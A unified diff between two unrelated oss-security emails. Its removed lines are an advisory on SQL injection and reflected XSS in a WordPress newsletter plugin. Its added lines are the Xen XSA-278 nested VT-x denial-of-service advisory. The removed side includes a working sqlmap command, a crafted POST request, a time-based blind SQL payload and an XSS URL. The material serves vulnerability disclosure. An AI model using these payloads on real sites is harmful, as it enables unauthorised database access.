@@ -1,131 +1,105 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/09/11/2
-Message-id: <655E4F0A-B5AF-4F71-8D64-5665973B76C0@me.com>
-Date: Tue, 11 Sep 2018 08:13:56 -0400
-From: "Larry W. Cashdollar" <larry0@...com>
-To: Open Security <oss-security@...ts.openwall.com>
-Subject: Blind SQL injection and multiple reflected XSS vulnerabilities in Wordpress Plugin Arigato Autoresponder and Newsletter v2.5
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/10/24/4
+Message-Id: <E1gFQSc-0001y8-8b@xenbits.xenproject.org>
+Date: Wed, 24 Oct 2018 21:13:02 +0000
+From: Xen.org security team <security@....org>
+To: xen-announce@...ts.xen.org, xen-devel@...ts.xen.org, xen-users@...ts.xen.org, oss-security@...ts.openwall.com
+CC: Xen.org security team <security-team-members@....org>
+Subject: Xen Security Advisory 278 v1 - x86: Nested VT-x usable even when disabled
 Content-Type: text/plain; charset=utf-8
 
-Title: Blind SQL injection and multiple reflected XSS vulnerabilities in Wordpress Plugin Arigato Autoresponder and Newsletter v2.5
-Author: Larry W. Cashdollar, @_larry0
-Date: 2018-08-22
-CVE-IDs:[CVE-2018-1002000][CVE-2018-1002001][CVE-2018-1002002][CVE-2018-1002003][CVE-2018-1002004][CVE-2018-1002005][CVE-2018-1002006][CVE-2018-1002007][CVE-2018-1002008][CVE-2018-1002009]
-Download Site: https://wordpress.org/plugins/bft-autoresponder/
-Vendor: Kiboko Labs https://calendarscripts.info/
-Vendor Notified: 2018-08-22, Fixed v2.5.1.5
-Vendor Contact: @prasunsen wordpress.org
-Advisory: http://www.vapidlabs.com/advisory.php?v=203
-Description: This plugin allows scheduling of automated autoresponder messages and newsletters, and managing a mailing list.  You can add/edit/delete and import/export members. There is also a registration form which can be placed in any website or blog. You can schedule unlimited number of email messages. Messages can be sent on defined number of days after user registration, or on a fixed date.
-Vulnerability:
-These vulnerabilities require administrative priveledges to exploit.
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA256
 
-CVE-2018-1002000
+                    Xen Security Advisory XSA-278
 
-There is an exploitable blind SQL injection vulnerability via the del_ids variable by POST request. 
+               x86: Nested VT-x usable even when disabled
 
-In line 69 of file controllers/list.php:
+ISSUE DESCRIPTION
+=================
 
-65 $wpdb->query("DELETE FROM ".BFT_USERS." WHERE id IN (".$_POST['del_ids'].")");
+When running HVM guests, virtual extensions are enabled in hardware because
+Xen is using them.  As a result, a guest can blindly execute the
+virtualisation instructions, and will exit to Xen for processing.
 
-del_ids is not sanitized properly.
+In the case that the guest hasn't followed the correct (virtual) configuration
+procedure, it shouldn't be able to use the instructions, and Xen should
+respond with #UD exception.  When nested virtualisation is disabled for the
+guest, it is not permitted to complete the configuration procedure.
 
-Nine Reflected XSS.
+Unfortunately, when nested virtualisation is intended to be disabled for the
+guest, an incorrect default value leads Xen to believe that the configuration
+procedure has already been completed.
 
-CVE-2018-1002001
+IMPACT
+======
 
-In line 22-23 of controllers/list.php:
+Guest software which blindly plays with the VT-x instructions can cause Xen to
+operate on uninitialised data.  As the backing memory is zeroed, this causes
+Xen to suffer a NULL pointer dereference, causing a host Denial of Service.
 
-22 $url = "admin.php?page=bft_list&offset=".$_GET['offset']."&ob=".$_GET['ob'];
-23 echo "<meta http-equiv='refresh' content='0;url=$url' />";
+Other behaviours such as memory corruption or privilege escalation have not
+been ruled out.
 
-CVE-2018-1002002
+VULNERABLE SYSTEMS
+==================
 
-bft_list.html.php:28: 
-<div><label><?php _e('Filter by email', 'broadfast')?>:</label> <input type="text" name="filter_email" value="<?php echo @$_GET['filter_email']?>"></div>
+Systems running Xen 4.9 or later are vulnerable.  Systems running Xen 4.8 or
+earlier are not vulnerable.
 
-CVE-2018-1002003
+Only Intel x86 systems are vulnerable.  Systems from other x86 vendors, and
+other hardware vendors are not vulnerable.
 
-bft_list.html.php:29: 
-<div><label><?php _e('Filter by name', 'broadfast')?>:</label> <input type="text" name="filter_name" value="<?php echo @$_GET['filter_name']?>"></div>
+Only x86 HVM and PVH guests can leverage this vulnerability.  x86 PV guests
+cannot leverage this vulnerability.
 
-CVE-2018-1002004
+MITIGATION
+==========
 
-bft_list.html.php:42: 
-<input type="text" class="bftDatePicker" name="sdate" id="bftSignupDate" value="<?php echo empty($_GET['sdate']) ? '' : $_GET['sdate']?>">
+Running only x86 PV guests will avoid the issue.
 
-CVE-2018-1002005
+For x86 HVM guests, while enabling nested virtualisation for affected guests
+does work around this particular DoS, it is not a security supported
+configuration and has other know DoS and suspected privilege escalation
+vulnerabilities.  Therefore, it is not a mitigation.
 
-bft_list.html.php:43: 
-<input type="hidden" name="filter_signup_date" value="<?php echo empty($_GET['filter_signup_date']) ? '' : $_GET['filter_signup_date']?>" id="alt_bftSignupDate"></div>
+CREDITS
+=======
 
-CVE-2018-1002006
+This issue was discovered by Sergey Dyasli of Citrix.
 
-integration-contact-form.html.php:14: 
-<p><label><?php _e('CSS classes (optional):', 'broadfast')?></label> <input type="text" name="classes" value="<?php echo @$_POST['classes']?>"></p>
+RESOLUTION
+==========
 
-CVE-2018-1002007
+Applying the appropriate attached patch resolves this issue.
 
-integration-contact-form.html.php:15: 
-<p><label><?php _e('HTML ID (optional):', 'broadfast')?></label> <input type="text" name="html_id" value="<?php echo @$_POST['html_id']?>"></p>
+xsa278.patch           xen-unstable
+xsa278-4.11.patch      Xen 4.11, 4.10, 4.9
 
-CVE-2018-1002008
+$ sha256sum xsa278*
+d94c59ee170f96af14f0cf696221ba8b9447b86820fe99fba1815ab93cc89cd7  xsa278.patch
+22686a9bbfbd38bb74292a28a452012d263875c9064815d4afd3fd6c62df0c3a  xsa278-4.11.patch
+$
 
-list-user.html.php:4: 
-<p><a href="admin.php?page=bft_list&ob=<?php echo $_GET['ob']?>&offset=<?php echo $_GET['offset']?>"><?php _e('Back to all subscribers', 'broadfast');?></a></p>
+NOTE CONCERNING LACK OF EMBARGO
+===============================
 
-CVE-2018-1002009
+This issue was first reported in private and was in the usual XSA process.
 
-unsubscribe.html.php:3: 
-<p><input type="text" name="email" value="<?php echo @$_GET['email']?>"></p>
+It was later independently reported in public with enough detail for the issue
+to be considered fully public.
+-----BEGIN PGP SIGNATURE-----
 
-Exploit Code:
-SQL Injection CVE-2018-1002000
-$ sqlmap --load-cookies=./cook -r post_data --level 2 --dbms=mysql
+iQFABAEBCAAqFiEEI+MiLBRfRHX6gGCng/4UyVfoK9kFAlvQ4AQMHHBncEB4ZW4u
+b3JnAAoJEIP+FMlX6CvZMncIAKPKEhtKfaVxNp3WxA2UYRYQCLjrPieFwn8WF/Bx
+Fcou5sCUhKZuRQccM5sOyDT8q/GRwYcvkcn3yXqXCKkijhsEA4fzsDYrCvQlO7RS
+xcRMJSBhovz81PPrlDfGVGB6f2Iq3JePVP9DNxwHhgNQJN0+3kdjzEUtKJx3VczE
+8LwIpQYyG4Xn3HBIjVD7R6+UiJLcDrD5sdRh9yOgNFNQQUqERtsAOEFJ2raYs/Cm
+hUvb5m3HBJSzcsZqdfTe5ovLwpumNygao43xt+lAA1KvKk148yEjO4E1dIklmFOE
+1d6Za6n9VD/+vTAo2JMDr0WpHZjzvBxNHkOg4levkYvKiCg=
+=fPmO
+-----END PGP SIGNATURE-----
 
-Where post_data is:
+Download attachment "xsa278.patch" of type "application/octet-stream" (10641 bytes)
 
-POST /wp-admin/admin.php?page=bft_list&ob=email&offset=0 HTTP/1.1
-Host: example.com
-Connection: keep-alive
-Content-Length: 150
-Cache-Control: max-age=0
-Origin: http://example.com
-Upgrade-Insecure-Requests: 1
-Content-Type: application/x-www-form-urlencoded
-User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
-Referer: http://example.com/wp-admin/admin.php?page=bft_list&ob=email&offset=0
-Accept-Encoding: gzip, deflate
-Accept-Language: en-US,en;q=0.9
-Cookie: wordpress_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
-
-mass_delete=1&del_ids=*&_wpnonce=aa7aa407db&_wp_http_referer=%2Fwp-admin%2Fadmin.php%3Fpage%3Dbft_list%26ob%3Demail%26offset%3D0[!http]
-
-
-(custom) POST parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
-sqlmap identified the following injection point(s) with a total of 300 HTTP(s) requests:
----
-Parameter: #1* ((custom) POST)
-Type: AND/OR time-based blind
-Title: MySQL >= 5.0.12 time-based blind - Parameter replace
-Payload: mass_delete=1&del_ids=(CASE WHEN (6612=6612) THEN SLEEP(5) ELSE 6612 END)&_wpnonce=aa7aa407db&_wp_http_referer=/wp-admin/admin.php?page=bft_list%26ob=email%26offset=0[!http]
----
-[11:50:08] [INFO] the back-end DBMS is MySQL
-web server operating system: Linux Debian 8.0 (jessie)
-web application technology: Apache 2.4.10
-back-end DBMS: MySQL >= 5.0.12
-[11:50:08] [INFO] fetched data logged to text files under '/home/larry/.sqlmap/output/192.168.0.47'
-
-[*] shutting down at 11:50:08
-
-
-CVE-2018-1002001
-
-http://example.com/wp-admin/admin.php?page=bft_list&action=edit&id=12&ob=XSS&offset=XSS
-
- 
-
- 
-
-
+Download attachment "xsa278-4.11.patch" of type "application/octet-stream" (10615 bytes)
